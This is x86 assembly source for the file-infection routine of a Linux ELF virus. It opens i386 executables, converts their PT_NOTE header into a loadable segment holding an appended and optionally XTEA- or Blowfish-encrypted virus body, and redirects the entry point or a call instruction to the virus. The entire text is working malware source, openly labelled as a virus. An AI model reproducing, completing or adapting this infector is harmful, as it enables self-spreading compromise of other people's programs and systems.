; By using this file, you agree to the terms and conditions set
; forth in the COPYING file which can be found at the top level
; of this distribution.
;
;------------------------------------------------------------------------------
infect_file:	pusha
		mov	ebx, [esp + 36]			; filename
		mov	ebp, [esp + 40]			; buffer
; throughout the code:
;	ebx		- file handle
;	edx		- file length
;	esi		- map
;	ebp		- buffer
; local vars
%define L_vadr	0	; virus virtual address
%define	L_cadr	4	; call address
%define	L_note	8	; PT_NOTE
%define	L_code	12	; code segment
%define L_mina	16	; minimal virtual address
%define	L_bfsz	20	; BF program size + VSIZE
%define L_dist	24	; disassembler table
%define	L_copy	L_dist	; virus copy

		cld

; Let's go, we are going to infect the fucko!
	; open(filename, 2)
		movb	eax, 5
		movb	ecx, 2
		int	0x80
		or	eax, eax
		js	.return

		xchg	eax, ebx
	
	; lseek(h, 0, 2)
		movb	eax, 19
		movb	ecx, 0
		movb	edx, 2
		int	0x80
		cmp	eax, 1024
		jb	.close

		xchg	eax, edx

	; mmap(NULL,length,PROT_READ|PROT_WRITE,MAP_SHARED,handle,offset)
		push	ebx				
		mpush	0, ebx, 1, 3, edx, 0
		movb	eax, 90		
		mov	ebx, esp
		int	0x80				
		add	esp, byte 24
		cmp	eax, 0xfffff000
		pop	ebx		
		ja	.close

		xchg	eax, esi

; Check ELF header
		cmp	dword [esi], 0x464c457f		; ELF file?
		jne	.unmap
		cmp	dword [esi + 16], 0x00030002	; e_type == ET_EXEC &&
		jne	.unmap				; e_machine == EM_386
		mov	al, [esi + 7]			; e_ident[EI_OSABI]
		cmp	al, 3				; Linux?
		je	.header_ok
		cmp	al, 0				; None? ;-)
		jne	.unmap
.header_ok:

; Find some values in PHDRs for later use
		movb	eax, 0
		mov	[ebp + L_note], eax
%ifdef	UEP
		mov	[ebp + L_code], eax
%endif
		dec	eax
		mov	[ebp + L_mina], eax
		mov	edi, dword [esi + 28]		; e_phoff
		movzx	ecx, word  [esi + 44]		; e_phnum
		add	edi, esi
	; find note
.find:		cmp	dword [edi + 0], 4
		jne	.c0
		mov	[ebp + L_note], edi
%ifdef	UEP
	; find code
.c0:		mov	eax, [edi + 0]
		dec	eax
		jnz	.c1
		mov	eax, [edi + 8]			
		cmp	[esi + 24], eax
		jb	.c1
		add	eax, [edi + 20]
		cmp	[esi + 24], eax
		ja	.c1
		mov	[ebp + L_code], edi
%else
.c0:
%endif
	; find phdr with minimal va
.c1:		mov	eax, [edi + 8]
		or	eax, eax			; STACK has 0 vaddr
		jz	.c2				; skip it, nah..
		cmp	eax, [ebp + L_mina]
		jae	.c2
		mov	[ebp + L_mina], eax
.c2:		add	edi, 32
		loop	.find
	; we need all three..		
		mov	eax, [ebp + L_mina]
		not	eax
		and	eax, [ebp + L_note]
%ifdef UEP
		and	eax, [ebp + L_code]
%endif
		jz	.unmap

%ifdef	UEP
; Find first call instruction
		; ebx - size
		; ecx - code
		; edi - buffer
		push	ebx
		mov	edi, [ebp + L_code]
		mov	eax, [esi + 24]			; entry point
		sub	eax, [edi + 8]			; entry point - p_vaddr
		mov	ebx, [edi + 16]			; p_filesz
		sub	ebx, eax			; p_filesz - p_vaddr
		add	eax, esi
		xchg	eax, ecx

	%ifdef	USE_LDE32
		lea	edi, [ebp + L_dist]
		push	edi
		call	disasm_init
		pop	eax
.fc_disasm:	push	ecx
		push	edi
		call	disasm_main
		add	esp, 8
		or	eax, eax
		js	.fc_failed
	%elifdef	USE_RGBLDE
.fc_disasm:	push	esi
		mov	esi, ecx
		call	get_opsize
		pop	esi
		cmp	al, 16
		ja	.fc_failed
	%elifdef	USE_MLDE32
.fc_disasm:	push	ecx
		call	mlde32
		add	esp, 4
		or	eax, eax
		jbe	.fc_failed
	%elifdef	USE_CATCHY
.fc_disasm:	push	esi
		mov	esi, ecx
		call	catchy
		pop	esi
		or	eax, eax
		js	.fc_failed
	%elifdef	USE_CATCHY2
.fc_disasm:	push	ecx
		call	catchy
		add	esp, 4
		or	eax, eax
		js	.fc_failed
	%endif
		cmp	byte [ecx], 0xe8
		je	.fc_return
		add	ecx, eax
		sub	ebx, eax
		cmp	ebx, 16
		ja	.fc_disasm
.fc_failed:	xor	ecx, ecx
.fc_return:	or	ecx, ecx
		pop	ebx
		jz	.unmap
		mov	[ebp + L_cadr], ecx
%endif
; /UEP

; Copy virus to buffer and encrypt it

		push	esi
	; copy
		lea	edi, [ebp + L_copy]
		push	edi
		call	virus_begin
		mov	esi, eax
		mov	ecx, VSIZE
		rep	movsb
		pop	edi
%ifdef	UEP
	; patch virus copy with call address
		mov	eax, [ebp + L_cadr]
		mov	eax, [eax + 1]
		mov	[edi + O(calladdr)], eax
%else
	; save old entry point in the copy of the body
		pop	esi
		push	esi
		mov	eax, [esi + 24]
		mov	[edi + O(retaddr)], eax
%endif
%ifdef	CRYPT
	; make key
		push	byte KEY_LENGTH
		push	byte 0
	%ifdef	OBFUSCATE_KEY
		lea	eax, [edi + VSIZE + 1024]
	%else
		lea	eax, [edi + VSIZE]
	%endif
		push	eax
		call	mk_key		; (*key, seed, count)
	%ifdef	OBFUSCATE_KEY
	; obfuscate key
		lea	ecx, [edi + VSIZE]
		push	ecx		; 1
			push	ecx		
			push	eax
			call	okey_bf	; (*key, *out)
		push	eax		; 2
	%endif
	; encrypt body
	%ifdef	OBFUSCATE_KEY
		lea	esi, [edi + VSIZE + 1024]
	%else
		lea	esi, [edi + VSIZE]
	%endif
		lea	edi, [edi + O(virus_start)]
		mov	ecx, ((virus_end - virus_start) / BLOCK_LENGTH)
	%ifdef		XTEA
	.do:	push	esi				; key
		push	edi				; buf
		call	XTEA_Encipher
		add	edi, BLOCK_LENGTH
		loop	.do
	%elifdef	BLOWFISH
		push	ebx
		lea	ebx, [esi + KEY_LENGTH]
		lea	eax, [ebx + 72]		
		push	ebx				;P
		push	eax				;S
		push	esi				;key
		call	blowfish_init
		
	.do:	push	ebx
		push	eax
		push	edi
		call	blowfish_encipher
		add	edi, BLOCK_LENGTH
		loop	.do
		pop	ebx
	%endif
	%ifdef	OBFUSCATE_KEY
	; get virus size VSIZE + BFPSIZE
		pop	ecx				;2
		pop	eax				;1
		sub	ecx, eax
		add	ecx, (VSIZE + 1)
		mov	[ebp + L_bfsz], ecx
	%else
		mov	dword [ebp + L_bfsz], (VSIZE + KEY_LENGTH)
	%endif
%else
		mov	dword [ebp + L_bfsz], VSIZE
%endif
		pop	esi

; Write virus body
		push	edx
		movb	eax, 4
		lea	ecx, [ebp + L_copy]
		mov	edx, [ebp + L_bfsz]
		int	0x80
		cmp	eax, edx
		pop	edx
		jne	.unmap		

; Patch PT_NOTE
		mov	edi, [ebp + L_note]
		movb	eax, 1
		stosd					; p_flags=PT_LOAD
		mov	eax, edx
		stosd					; p_offset=file length
		mov	eax, [ebp + L_mina]
		sub	eax, (2 * PAGE_SIZE)
		mov	ecx, edx			; file length
		and	ecx, (PAGE_SIZE - 1)
		add	eax, ecx
		mov	[ebp + L_vadr], eax
		stosd					; p_vaddr
		stosd					; p_paddr
		mov	eax, [ebp + L_bfsz]
		stosd					; p_filesz
		stosd					; p_memsz
		movb	eax, 6				; PF_R | PF_W
		stosd					; p_flags
		movb	eax, 1
		stosd					; align (just in case)


%ifdef UEP
; Ok, finally, change the address in call to virus entry point
		mov	edi, [ebp + L_code]
		mov	ecx, [ebp + L_cadr]		; (map + call_offset)
		mov	eax, esi
		sub	eax, ecx
		sub	eax, [edi + 8]			; - p_vaddr
		add	eax, [ebp + L_vadr]		; + v_vaddr
		lea	eax, [eax - 5 + O(entry_point)]	; - 5 + virus_entry
		mov	[ecx + 1], eax
%else
; Ok, change the entry point in the ELF header
		mov	eax, [ebp + L_vadr]
		lea	eax, [eax + O(entry_point)]
		mov	[esi + 24], eax
%endif
; All done, exit code 0
		xor	ebp, ebp

.unmap:		push    ebx
		movb	eax, 91
		mov	ebx, esi
		mov	ecx, edx
		int	0x80
		pop	ebx
.close:		movb	eax, 6
		int	0x80
.return:	mov	[esp + 28], ebp
		popa
		retn	8

%ifdef USE_LDE32
		%include	"include/lde32bin.inc"	; LDE32
%elifdef USE_RGBLDE
		%include	"include/rgblde.inc"	; RGBLDE
%elifdef USE_MLDE32
		%include	"include/mlde32.inc"	; MLDE32
%elifdef USE_CATCHY
		%include	"include/catchy.inc"	; Catchy (original)
%elifdef USE_CATCHY2
		%include	"include/catchy.inc"	; Catchy (my version)
%endif
%ifdef CRYPT
	%ifdef XTEA
		%include 	'include/xtea_encipher.asm'	; XTEA encryption	
		%include	'mk_key.asm'			; BF key gen
	%endif
	%ifdef OBFUSCATE_KEY
		%include	'obskey.asm'
	%endif
%endif
;EOF
